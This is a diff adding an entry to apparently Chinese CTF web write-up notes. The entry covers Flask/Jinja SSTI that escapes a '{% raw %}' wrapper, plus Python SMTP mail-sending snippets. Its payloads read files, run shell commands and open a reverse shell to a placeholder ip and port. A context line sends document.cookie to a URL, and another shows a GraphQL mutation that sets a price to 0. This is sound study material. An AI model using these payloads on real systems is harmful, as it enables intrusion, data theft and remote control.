@@ -2384,3 +2384,48 @@ js.fetch("url" + js.document.cookie)
 - query-engine（graphql）相关。相关源码可在prisma/prisma-engines仓库找到，其中路由信息可在[这里](https://github.com/prisma/prisma-engines/blob/main/query-engine/query-engine/src/server/mod.rs#L48)找到。
   - query-engine的端口是随机的，在30000到50000之间。
   - mutation更改数据库中数据的请求。`{"variables":{},"query":"mutation {\n  updateManyItem(data: { price: {set: 0}  }, where: { id: 2 }) { count }}"}`。将id为2的物品价格设为0，当然不同题目的参数不一样。若服务器返回`QueryError(SqliteFailure(Error{ code: ReadOnly, extended_code: 8 }, ...)`，说明背后的数据库不允许当前用户改动数据，readonly。
+243. [wanky mail](https://ctftime.org/writeup/37173)
+- python flask ssti.即使是像下面的函数一样尝试用`{% raw %}`包裹未经过滤的字符串，仍然有注入风险。
+    ```py
+    def esc(s: str):
+        return "{% raw %}" + s + "{% endraw %}"
+    ```
+    闭合即可。`{% endraw %}{{ code }}{% raw %}`
+  - ssti注入payload：
+    - `{{ get_flashed_messages.__globals__.__builtins__.__import__("os").listdir() }}`
+    - `{{ get_flashed_messages.__globals__.__builtins__.open("flag.txt").read() }}`
+    - `{{ ''.__class__.__base__.__subclasses__()[352](["python", "-c", "import socket,os,pty;s=socket.socket();s.connect(('ip',port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('/bin/sh')"]) }}`:反弹shell
+    - `{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('cat flag.txt').read()}}{%endif%}{% endfor %}`:无需另外爆破索引
+    - `{{''.__class__.__mro__[1].__subclasses__()[352]("cat /flag*", shell=True, stdout=-1).communicate()}}`
+- python与SMTP服务器进行交互。
+    ```py
+    import smtplib
+    msg=
+    smtplib.SMTP('domain',8025).sendmail(
+        'sender', 
+        'receiver',
+        msg
+    )
+    ```
+    ```py
+    from pwn import *
+    def send_mail(content, address):
+        r = remote("domain", 25)
+        r.newline = b"\r\n"
+        r.recvline()
+        r.sendline(b"HELO domain")
+        r.recvline()
+        r.sendline(b"MAIL FROM:" + address.encode() + b"@domain")
+        r.recvline()
+        r.sendline(b"RCPT TO:" + address.encode() + b"@domain")
+        r.recvline()
+        r.sendline(b"DATA")
+        r.recvline()
+        r.sendline(content.encode())
+        r.sendline(b"\r\n.")
+        r.recvline()
+        r.sendline(b"QUIT")
+        r.recvline()
+        r.close()
+    send_mail('', input("address: ").strip())
+    ```
